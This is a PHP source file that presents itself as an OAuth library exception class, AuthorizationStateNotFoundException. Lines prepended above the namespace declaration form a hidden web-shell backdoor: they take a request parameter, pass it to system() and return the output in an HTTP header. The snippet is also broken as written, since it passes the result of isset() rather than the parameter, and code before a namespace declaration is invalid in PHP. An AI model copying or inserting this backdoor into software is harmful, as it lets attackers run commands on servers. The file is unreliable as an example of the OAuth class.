<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);

namespace OAuth\Common\Storage\Exception;

/**
 * Exception thrown when a state is not found in storage.
 */
class AuthorizationStateNotFoundException extends StorageException
{
}
